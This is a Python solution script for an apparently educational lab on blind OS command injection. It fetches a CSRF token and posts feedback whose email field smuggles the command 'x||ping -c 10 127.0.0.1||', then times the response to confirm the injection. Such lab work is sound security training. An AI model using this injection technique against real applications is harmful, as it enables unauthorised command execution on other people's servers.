"""
    Lab: Blind OS command injection with time delays

    This script exploits a blind OS command injection vulnerability using time delays.

    This lab contains a blind OS command injection vulnerability in the feedback function.
    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
    To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

    Steps:
    1. Send feedback with the email parameter set to: x||ping -c 10 127.0.0.1||
    2. Observe the response time to confirm the injection (should delay ~10 seconds)

    Author: N00BCYB0T
"""

import argparse
import time
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    feedback_url = f"{url}/feedback/submit"
    # Get CSRF token from feedback page
    csrf_token = get_csrf(session, f"{url}/feedback")
    data = {
        "name": "attacker",
        "email": "x||ping -c 10 127.0.0.1||",
        "subject": "test",
        "message": "test",
        "csrf": csrf_token
    }

    print(f"{Fore.YELLOW}[*] Sending feedback with command injection payload...{Fore.RESET}")
    start = time.time()
    r = session.post(feedback_url, data=data)
    elapsed = time.time() - start
    print(f"{Fore.GREEN}[+] Server response code: {r.status_code}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Response time: {elapsed:.2f} seconds{Fore.RESET}")
    if elapsed > 8:
        print(f"{Fore.GREEN}[+] Likely vulnerable to blind OS command injection!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] No significant delay detected.{Fore.RESET}")

def get_csrf(session, page_url):
    r = session.get(page_url)
    import re
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on feedback page{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()
